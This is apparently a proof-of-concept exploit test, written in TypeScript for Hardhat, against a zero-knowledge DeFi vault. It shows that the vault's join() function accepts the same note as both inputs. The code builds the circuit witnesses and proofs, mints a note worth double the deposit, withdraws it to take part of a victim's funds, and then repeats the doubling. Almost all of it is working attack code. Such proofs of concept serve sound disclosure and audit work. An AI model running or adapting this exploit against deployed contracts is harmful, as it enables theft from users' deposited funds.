/**
 * PoC: ZendexVaultManager.join() lets a single note be used as BOTH inputs.
 *
 * join.nr never asserts nullifier_a != nullifier_b (or commitment_a != commitment_b),
 * and ZendexVaultManager.join() checks _validateNullifier(A) and _validateNullifier(B)
 * BEFORE either _consume(), then calls _consume() twice on the same value
 * (TreeOperator.consume is a plain `nullifierUsed[n] = true`, no revert on repeat).
 *
 * => amount_c = amount_a + amount_b = 2 * X from a single X-value note. Free money.
 */
import { Wallet } from "ethers";
import { ethers, upgrades } from "hardhat";
import { poseidon2, poseidon3 } from "poseidon-lite";
import { UltraHonkBackend } from "@aztec/bb.js";
import { Noir } from "@noir-lang/noir_js";
import { expect } from "chai";

import * as fs from "fs";
import * as path from "path";

import { getCommitment, getXY, getNullifier, generateSalt, getFooter } from "../../scripts/utils";

const depositCircuit = JSON.parse(
  fs.readFileSync(path.join(__dirname, "../../circuits/deposit/target/deposit.json"), "utf8")
);
const joinCircuit = JSON.parse(fs.readFileSync(path.join(__dirname, "../../circuits/join/target/join.json"), "utf8"));
const inclusionCircuit = JSON.parse(
  fs.readFileSync(path.join(__dirname, "../../circuits/inclusion/target/inclusion.json"), "utf8")
);
const withdrawCircuit = JSON.parse(
  fs.readFileSync(path.join(__dirname, "../../circuits/withdraw/target/withdraw.json"), "utf8")
);

const TREE_DEPTH = 8;
const ARR = 32;

let vault: any, manager: any, treeOperator: any, verifierHub: any;
let zenToken: any, usdtToken: any, usdcToken: any, daiToken: any;
let depositVerifier: any, joinVerifier: any, inclusionVerifier: any, withdrawVerifier: any;

let depositNoir: Noir, joinNoir: Noir, inclusionNoir: Noir, withdrawNoir: Noir;
let depositBackend: UltraHonkBackend,
  joinBackend: UltraHonkBackend,
  inclusionBackend: UltraHonkBackend,
  withdrawBackend: UltraHonkBackend;

const attackerPk = "0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80";
const attacker = new Wallet(attackerPk);
const victimPk = "0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d";
const victim = new Wallet(victimPk);

const threads = (globalThis as any).navigator?.hardwareConcurrency || 4;

describe("PoC: join() self-join value inflation", function () {
  this.timeout(3_600_000);

  before(async function () {
    const [deployer] = await ethers.getSigners();

    const MockToken = await ethers.getContractFactory("MockERC20");
    zenToken = await MockToken.deploy("Zen", "ZEN", 18);
    usdtToken = await MockToken.deploy("USDT", "USDT", 6);
    usdcToken = await MockToken.deploy("USDC", "USDC", 6);
    daiToken = await MockToken.deploy("DAI", "DAI", 18);

    depositVerifier = await (await ethers.getContractFactory("DepositVerifier")).deploy();
    joinVerifier = await (await ethers.getContractFactory("JoinVerifier")).deploy();
    inclusionVerifier = await (await ethers.getContractFactory("InclusionVerifier")).deploy();
    withdrawVerifier = await (await ethers.getContractFactory("WithdrawVerifier")).deploy();

    verifierHub = await upgrades.deployProxy(
      await ethers.getContractFactory("ZendexVerifierHub"),
      [
        {
          depositVerifier: depositVerifier.target,
          withdrawalVerifier: withdrawVerifier.target,
          inclusionVerifier: inclusionVerifier.target,
          addLiquidityVerifier: ethers.ZeroAddress,
          removeLiquidityVerifier: ethers.ZeroAddress,
          swapVerifier: ethers.ZeroAddress,
          splitVerifier: ethers.ZeroAddress,
          joinVerifier: joinVerifier.target,
          createOrderVerifier: ethers.ZeroAddress,
          requestCancelOrderVerifier: ethers.ZeroAddress,
          initialOwner: deployer.address,
        },
      ],
      { initializer: "initialize" }
    );

    const poseidonLib = await (await ethers.getContractFactory("PoseidonT3")).deploy();

    manager = await upgrades.deployProxy(await ethers.getContractFactory("ZendexVaultManager"), [], {
      initializer: false,
    });

    treeOperator = await (
      await ethers.getContractFactory("TreeOperator", {
        libraries: { "poseidon-solidity/PoseidonT3.sol:PoseidonT3": poseidonLib.target },
      })
    ).deploy({
      admin: deployer.address,
      vaultManager: manager.target,
      ammManager: ethers.ZeroAddress,
      orderBookManager: ethers.ZeroAddress,
      depth: TREE_DEPTH,
    });

    vault = await (
      await ethers.getContractFactory("ZendexVault")
    ).deploy({
      admin: deployer.address,
      zen: zenToken.target,
      usdt: usdtToken.target,
      usdc: usdcToken.target,
      dai: daiToken.target,
      vaultManager: manager.target,
      ammManager: ethers.ZeroAddress,
      orderBookManager: ethers.ZeroAddress,
    });

    await manager.initialize({
      admin: deployer.address,
      verifierHub: verifierHub.target,
      tree: treeOperator.target,
      vault: vault.target,
    });

    for (const w of [attacker, victim]) {
      await usdtToken.mint(w.address, ethers.parseUnits("1000000", 6));
      await deployer.sendTransaction({ to: w.address, value: ethers.parseEther("10") });
      const s = await ethers.getImpersonatedSigner(w.address);
      await usdtToken.connect(s).approve(manager.target, ethers.parseUnits("1000000", 6));
    }

    depositNoir = new Noir(depositCircuit);
    joinNoir = new Noir(joinCircuit);
    inclusionNoir = new Noir(inclusionCircuit);
    withdrawNoir = new Noir(withdrawCircuit);
    depositBackend = new UltraHonkBackend(depositCircuit.bytecode, { threads });
    joinBackend = new UltraHonkBackend(joinCircuit.bytecode, { threads });
    inclusionBackend = new UltraHonkBackend(inclusionCircuit.bytecode, { threads });
    withdrawBackend = new UltraHonkBackend(withdrawCircuit.bytecode, { threads });
  });

  after(function () {
    depositBackend.destroy();
    joinBackend.destroy();
    inclusionBackend.destroy();
    withdrawBackend.destroy();
  });

  async function performDeposit(who: Wallet, assetId: bigint, amount: bigint, rho: bigint) {
    const { x, y } = getXY(who.signingKey.publicKey);
    const commitment = getCommitment(assetId, amount, rho, who.signingKey.publicKey);
    const nullifier = getNullifier(rho, x, y);

    const { witness } = await depositNoir.execute({
      asset_id: assetId.toString(),
      amount: amount.toString(),
      commitment: commitment.toString(),
      pk_x: x.toString(),
      pk_y: y.toString(),
      rho: rho.toString(),
    });
    const proofData = await depositBackend.generateProof(witness, { keccak: true });

    const s = await ethers.getImpersonatedSigner(who.address);
    const receipt = await (await manager.connect(s).deposit(proofData)).wait();
    const ev = receipt.logs.find(
      (l: any) => l.topics[0] === treeOperator.interface.getEvent("LeafInserted").topicHash
    );
    const epochId = treeOperator.interface.parseLog(ev).args.epoch;
    return { commitment, nullifier, rho, assetId, amount, epochId };
  }

  function zeroHashes(depth: number) {
    const z: bigint[] = [0n];
    for (let i = 0; i < depth; i++) z[i + 1] = poseidon2([z[i], z[i]]);
    return z;
  }

  async function generateInclusionProof(commitment: bigint, epochId: bigint, saltOverride?: bigint) {
    const salt = saltOverride ?? generateSalt();
    const merkleRoot = await treeOperator.getHistoricalRoot(epochId);
    const tag = poseidon3([epochId, commitment, salt]);

    const [siblings, indices] = await treeOperator.getHistoricalProof(commitment, epochId);

    let cur = commitment;
    let actualDepth = 0;
    for (let i = 0; i < siblings.length; i++) {
      cur = indices[i] === 0n ? poseidon2([cur, siblings[i]]) : poseidon2([siblings[i], cur]);
      actualDepth = i + 1;
      if (cur === merkleRoot) break;
    }

    const z = zeroHashes(TREE_DEPTH);
    const fs_: bigint[] = [...siblings];
    const fi: bigint[] = [...indices];
    for (let i = siblings.length; i < TREE_DEPTH; i++) {
      fs_.push(z[i]);
      fi.push(0n);
    }
    while (fs_.length < ARR) {
      fs_.push(0n);
      fi.push(0n);
    }

    const { witness } = await inclusionNoir.execute({
      merkle_root: merkleRoot.toString(),
      epoch_id: epochId.toString(),
      tag: BigInt(tag).toString(),
      salt: salt.toString(),
      commitment: commitment.toString(),
      merkle_depth: actualDepth.toString(),
      merkle_proof: fs_.map((p) => p.toString()),
      merkle_indices: fi.map((i) => parseInt(i.toString())),
    });
    const proofData = await inclusionBackend.generateProof(witness, { keccak: true });
    return { inclusionProofData: proofData, tag: BigInt(tag), salt };
  }

  it("mints a note worth 2x the deposit by joining one note with itself, then withdraws the victim's funds", async function () {
    const assetId = 1n; // USDT (6 decimals) -- join.nr range-checks amounts to u64
    const attackerDeposit = ethers.parseUnits("100000", 6); // 1e11
    const victimDeposit = ethers.parseUnits("1000000", 6); // 1e12

    // --- 1. attacker deposits 100, victim deposits 1000 -----------------------
    const a = await performDeposit(attacker, assetId, attackerDeposit, 12345n);
    await performDeposit(victim, assetId, victimDeposit, 777777n);

    const vaultBal = await usdtToken.balanceOf(vault.target);
    expect(vaultBal).to.equal(attackerDeposit + victimDeposit);

    // --- 2. ONE inclusion proof for the attacker's ONE note -------------------
    const { inclusionProofData, tag, salt } = await generateInclusionProof(a.commitment, a.epochId);

    // --- 3. join proof that uses that single note as BOTH inputs -------------
    const { x, y } = getXY(attacker.signingKey.publicKey);
    const nullifier = getNullifier(a.rho, x, y); // identical for A and B
    const amountC = a.amount * 2n; // 2 x 100 = 200, out of thin air
    const rhoC = 999_999n;
    const commitmentC = poseidon3([assetId, amountC, getFooter(rhoC, x, y)]);

    const { witness } = await joinNoir.execute({
      nullifier_a: nullifier.toString(),
      nullifier_b: nullifier.toString(), //  <-- same nullifier
      commitment_c: commitmentC.toString(),
      tag_a: tag.toString(),
      tag_b: tag.toString(), //  <-- same tag
      asset_id: assetId.toString(),
      amount_a: a.amount.toString(),
      amount_b: a.amount.toString(),
      amount_c: amountC.toString(),
      commitment_a: a.commitment.toString(),
      commitment_b: a.commitment.toString(), //  <-- same commitment
      pk_x: x.toString(),
      pk_y: y.toString(),
      rho_a: a.rho.toString(),
      rho_b: a.rho.toString(), //  <-- same rho
      rho_c: rhoC.toString(),
      epoch_id_a: a.epochId.toString(),
      epoch_id_b: a.epochId.toString(),
      salt_a: salt.toString(),
      salt_b: salt.toString(),
    });
    const joinProofData = await joinBackend.generateProof(witness, { keccak: true });
    expect(await joinBackend.verifyProof(joinProofData, { keccak: true })).to.be.true;
    expect(await joinVerifier.verify(joinProofData.proof, joinProofData.publicInputs)).to.be.true;

    // --- 4. submit: the SAME inclusion proof is passed for both sides ---------
    const s = await ethers.getImpersonatedSigner(attacker.address);
    await manager.connect(s).join(inclusionProofData, inclusionProofData, joinProofData);

    const joinReceipt = await treeOperator.commitments(commitmentC);
    expect(joinReceipt, "inflated note was inserted into the tree").to.be.true;

    // find epoch of commitmentC
    const epochC = (await treeOperator.currentEpoch()) - 1n;

    // --- 5. withdraw the inflated note ---------------------------------------
    const { inclusionProofData: incC, tag: tagC, salt: saltC } = await generateInclusionProof(commitmentC, epochC);

    const nullifierC = getNullifier(rhoC, x, y);
    const recipient = attacker.address;
    const { witness: wW } = await withdrawNoir.execute({
      asset_id: assetId.toString(),
      amount: amountC.toString(),
      nullifier: nullifierC.toString(),
      tag: tagC.toString(),
      recipient: recipient.toString(),
      rho: rhoC.toString(),
      salt: saltC.toString(),
      epoch_id: epochC.toString(),
      commitment: commitmentC.toString(),
      pk_x: x.toString(),
      pk_y: y.toString(),
      recipient_proof: poseidon2([BigInt(recipient), rhoC]).toString(),
    });
    const withdrawProofData = await withdrawBackend.generateProof(wW, { keccak: true });

    const balBefore = await usdtToken.balanceOf(attacker.address);
    await manager.connect(s).withdraw(incC, withdrawProofData);
    const balAfter = await usdtToken.balanceOf(attacker.address);

    const gained = balAfter - balBefore;
    console.log(`  attacker deposited : ${ethers.formatUnits(attackerDeposit, 6)} USDT`);
    console.log(`  attacker withdrew  : ${ethers.formatUnits(gained, 6)} USDT`);
    console.log(`  net profit (stolen): ${ethers.formatUnits(gained - attackerDeposit, 6)} USDT`);
    console.log(`  vault USDT left    : ${ethers.formatUnits(await usdtToken.balanceOf(vault.target), 6)}`);

    expect(gained).to.equal(attackerDeposit * 2n);
    expect(await usdtToken.balanceOf(vault.target)).to.equal(victimDeposit - attackerDeposit);
  });

  it("iterates: 1 unit -> 2 -> 4 -> 8 ... unbounded inflation from a single note", async function () {
    const assetId = 2n; // USDC
    const [deployer] = await ethers.getSigners();
    await usdcToken.mint(attacker.address, ethers.parseUnits("1000000", 6));
    const s = await ethers.getImpersonatedSigner(attacker.address);
    await usdcToken.connect(s).approve(manager.target, ethers.parseUnits("1000000", 6));

    const { x, y } = getXY(attacker.signingKey.publicKey);

    let note = await performDeposit(attacker, assetId, 1_000_000n, 555_000n); // 1 USDC
    const seed = note.amount;

    for (let round = 0; round < 4; round++) {
      const { inclusionProofData, tag, salt } = await generateInclusionProof(note.commitment, note.epochId);
      const nullifier = getNullifier(note.rho, x, y);
      const amountC = note.amount * 2n;
      const rhoC = 700_000n + BigInt(round);
      const commitmentC = poseidon3([assetId, amountC, getFooter(rhoC, x, y)]);

      const { witness } = await joinNoir.execute({
        nullifier_a: nullifier.toString(),
        nullifier_b: nullifier.toString(),
        commitment_c: commitmentC.toString(),
        tag_a: tag.toString(),
        tag_b: tag.toString(),
        asset_id: assetId.toString(),
        amount_a: note.amount.toString(),
        amount_b: note.amount.toString(),
        amount_c: amountC.toString(),
        commitment_a: note.commitment.toString(),
        commitment_b: note.commitment.toString(),
        pk_x: x.toString(),
        pk_y: y.toString(),
        rho_a: note.rho.toString(),
        rho_b: note.rho.toString(),
        rho_c: rhoC.toString(),
        epoch_id_a: note.epochId.toString(),
        epoch_id_b: note.epochId.toString(),
        salt_a: salt.toString(),
        salt_b: salt.toString(),
      });
      const joinProofData = await joinBackend.generateProof(witness, { keccak: true });
      await manager.connect(s).join(inclusionProofData, inclusionProofData, joinProofData);

      note = {
        commitment: commitmentC,
        nullifier: getNullifier(rhoC, x, y),
        rho: rhoC,
        assetId,
        amount: amountC,
        epochId: (await treeOperator.currentEpoch()) - 1n,
      };
      console.log(`  round ${round + 1}: note now worth ${ethers.formatUnits(note.amount, 6)} USDC`);
    }

    expect(note.amount).to.equal(seed * 16n);
    console.log(`  seeded with ${ethers.formatUnits(seed, 6)} USDC -> holds ${ethers.formatUnits(note.amount, 6)} USDC after 4 joins`);
  });
});
